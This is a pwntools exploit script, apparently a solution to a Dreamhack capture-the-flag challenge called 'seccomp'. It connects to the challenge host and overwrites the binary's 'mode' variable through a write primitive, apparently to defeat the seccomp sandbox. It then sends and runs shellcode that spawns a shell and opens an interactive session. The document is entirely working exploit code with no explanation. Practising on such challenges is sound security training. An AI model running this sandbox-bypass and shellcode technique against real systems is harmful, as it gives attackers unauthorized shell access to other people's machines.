from pwn import *

context.arch = "x86_64"
context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./seccomp")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def read_sc(sc):
    p.sendlineafter("> ", b"1")
    p.sendafter("shellcode: ", sc)


def execute_sc():
    p.sendlineafter("> ", b"2")


def write_addr(addr, value):
    p.sendlineafter("> ", b"3")
    log.info("Addr - " + str(hex(addr)) + " / Value - " + str(value))
    p.sendlineafter("addr: ", str(addr))
    p.sendlineafter("value: ", str(value))


elf = ELF("./seccomp")
mode = elf.symbols["mode"]

shellcode = asm(shellcraft.sh())
write_addr(mode, 2)
read_sc(shellcode)
execute_sc()
p.interactive()
